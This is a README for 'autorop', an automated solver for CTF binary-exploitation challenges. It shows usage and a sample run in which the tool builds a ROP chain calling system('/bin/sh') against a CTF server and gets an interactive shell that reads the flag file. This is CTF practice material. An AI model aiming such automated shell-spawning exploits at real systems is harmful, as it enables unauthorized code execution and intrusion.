autorop
=======

Automated solver of classic CTF pwn challenges, with flexibility in mind.

Command line
------------

.. code-block:: text

    $ python -m autorop.autorop
    Usage: autorop BINARY [HOST IP]

.. code-block:: text

    $ python -m autorop.autorop tests/bamboofox/ret2libc bamboofox.cs.nctu.edu.tw 11002
    [+] Opening connection to bamboofox.cs.nctu.edu.tw on port 11002: Done
    [*] '/data/Projects/autorop/tests/bamboofox/ret2libc'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [*] Pipeline [1/4]: corefile
    ...
    [*] Pipeline [4/4]: system_binsh
    [*] Loaded 151 cached gadgets for '.autorop.libc'
    [*] 0x0000:       0xf7e09e70 system(0xf7f29fcc)
        0x0004:       0xf7df7bfa <adjust @0xc> add esp, 4; ret
        0x0008:       0xf7f29fcc arg0
        0x000c:        0x80484ed main()
    [*] Switching to interactive mode
    Hello!
    The address of "/bin/sh" is 0x804a02c
    The address of function "puts" is 0xf7e2eda0
    $ wc -c /home/ctf/flag
    57 /home/ctf/flag
